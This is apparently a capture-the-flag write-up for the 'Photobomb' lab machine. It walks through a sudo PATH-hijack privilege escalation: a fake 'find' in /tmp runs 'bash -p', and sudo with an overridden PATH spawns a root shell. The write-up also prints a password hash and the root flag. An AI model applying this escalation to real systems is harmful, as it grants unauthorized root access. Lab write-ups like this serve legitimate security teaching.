1)Let's see the sudo privileges that wizard has:
```
wizard@photobomb:~$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
```
------------------------------------------------------------

 wizard@photobomb:~/photobomb$ cat .htpasswd
    cat .htpasswd
    pH0t0:$apr1$dnyF00ZD$9PifZwUxL/J0BCS/wTShU1

--------------------------------------------------
```
2) Open the file  cleanup.sh: cat /opt/cleanup.sh
```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
3) The script in question has a vulnerability. Indeed, the "find" utility is not defined with its absolute path, we could abuse it to get a root shell. Let's create a Bash script under the name of find in "/tmp". This will copy bash and assign it the setuid Root.

4)Print a list of current environment variables: env
```
SHELL=/bin/bash
PWD=/tmp
LOGNAME=wizard
HOME=/home/wizard
LANG=en_US.UTF-8
LS_COLORS=
INVOCATION_ID=524884486caa4677816304b64f18dca4
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
USER=wizard
SHLVL=2
JOURNAL_STREAM=9:32090
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/home/wizard/photobomb
_=/usr/bin/env
```
5) In the find file we write into it:  bash -p
6) We are interested in the PATH variable, let's rewrite it to spwan a root shell: 
```
sudo PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /opt/cleanup.sh
```
7)  Then we navigate to the filesystem and get the root flag: 
```
whoami
root
pwd
/home/wizard/photobomb
cd /root
ls
root.txt
cat root.txt
8084adb6cdd9b7a889e36f37915e9496
```

